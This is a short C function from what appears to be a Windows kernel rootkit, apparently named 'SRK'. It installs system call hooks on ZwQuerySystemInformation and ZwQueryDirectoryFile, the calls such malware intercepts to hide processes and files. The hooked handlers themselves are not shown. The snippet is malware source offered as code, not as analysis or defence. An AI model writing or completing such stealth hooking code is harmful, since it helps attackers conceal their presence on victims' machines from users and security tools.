// Initialize system call hooks
NTSTATUS InitializeHooks()
{
    NTSTATUS status;

    status = HookSystemCall(L"ZwQuerySystemInformation", &g_OriginalZwQuerySystemInformation, (PVOID)HookedZwQuerySystemInformation, &g_ZwQuerySystemInformationHook);
    if (!NT_SUCCESS(status)) {
        SRK_DEBUG_PRINT_EX(DPFLTR_ERROR_LEVEL, "Failed to hook ZwQuerySystemInformation");
        return status;
    }

    status = HookSystemCall(L"ZwQueryDirectoryFile", &g_OriginalZwQueryDirectoryFile, (PVOID)HookedZwQueryDirectoryFile, &g_ZwQueryDirectoryFileHook);
    if (!NT_SUCCESS(status)) {
        SRK_DEBUG_PRINT_EX(DPFLTR_ERROR_LEVEL, "Failed to hook ZwQueryDirectoryFile");
        return status;
    }

    SRK_DEBUG_PRINT_EX(DPFLTR_INFO_LEVEL, "System call hooks initialized successfully");
    return STATUS_SUCCESS;
}
